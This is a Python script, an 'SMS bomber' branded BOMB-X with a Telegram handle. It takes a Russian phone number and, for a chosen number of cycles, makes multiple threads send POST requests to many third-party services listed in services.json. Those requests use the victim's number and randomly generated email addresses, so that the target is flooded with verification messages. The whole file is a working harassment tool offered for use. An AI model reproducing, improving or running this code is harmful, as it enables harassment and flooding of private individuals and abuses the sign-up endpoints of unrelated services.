import os                        # terminal cleanup
import json                      # load services
import time                      # delays
import requests                  # main lib
import random                    # mail generating
import string                    # mail generating
from colorama import Fore        # color
import concurrent.futures

with open(r'services.json', encoding="utf8") as js:      # load services to dict from services.json
    services = json.load(js)

os.system('cls')

def logo():
    print('''
  ____    ____   __  __  ____             __   __
 |  _ \  / __ \ |  \/  ||  _ \            \ \ / /
 | |_) || |  | || \  / || |_) |   ______   \ V / 
 |  _ < | |  | || |\/| ||  _ <   |______|   > <  
 | |_) || |__| || |  | || |_) |            / . \ 
 |____/  \____/ |_|  |_||____/            /_/ \_\
    ''')

dbg = False


if not dbg:
    logo()
    time.sleep(1)
    print('\nTELEGRAM: @MEPPCI')
    time.sleep(3)
    os.system('cls')

    logo()

phone = input('\n[#] Enter number (without +7 and spaces: 9030001234): ')

os.system('cls')

#   split phone on segments
code = phone[0:3]
seg_1 = phone[3:6]
seg_2 = phone[6:8]
seg_3 = phone[8:11]

if phone[0] == '7' or len(phone) != 10:
    logo()
    print('\n [!] Wrong phone number!')
    time.sleep(3)
    exit()

os.system('cls')
logo()
cyc = int(input('\n[#] How many cycles?: '))

os.system('cls')
logo()
print(f'\n[#] Services: {len(services)}')
print('[#] Starting bomber!')
time.sleep(3)


def send_request(service):
    cur_service = services[service]

    ## formatting phone by mask ##
    json_data = cur_service['request_data']  
    phone_key_name = cur_service['service_data']["phone_key"] 
    formatted_phone = cur_service['service_data']['phone_mask'].replace('*code*', code).replace('*seg_1*', seg_1).replace('*seg_2*', seg_2).replace('*seg_3*', seg_3)
    json_data[phone_key_name] = formatted_phone   # change phone to masked phone

    ## formatting email ##
    if cur_service['service_data']['email_key'] != '':
        json_data[cur_service['service_data']['email_key']] = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(6, 13))) + '@gmail.com'

    ## sending request ##
    try:
        r = requests.post(
            url = cur_service['service_data']['link'],
            json=json_data,
            timeout=6
        )
        if r.status_code == 200:
            print(Fore.GREEN + f'[  +  ] {service}' + Fore.RESET)
            return True
        else:
            print(Fore.RED + f'[ {r.status_code} ] {service}' + Fore.RESET)
            return False

    except Exception as e:
        print(Fore.RED + f'[ TME ] {service}' + Fore.RESET)
        return False

if __name__ == '__main__':
    successfull = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_service = {}
        for i in range(1, cyc+1):
            for service in services:
                future = executor.submit(send_request, service)
                future_to_service[future] = service

        for future in concurrent.futures.as_completed(future_to_service):
            service = future_to_service[future]
            if future.result():
                successfull += 1

    print(Fore.GREEN + '\n[#] Done!' + Fore.RESET)
    time.sleep(3)

os.system('cls')
logo()
print(f'\n[#] Work Done!\n\n[#] Stats:\nTotal requests: {cyc*len(services)}\nSuccessfull: {successfull}')
print('\n\n[#] Press any key to exit')
input()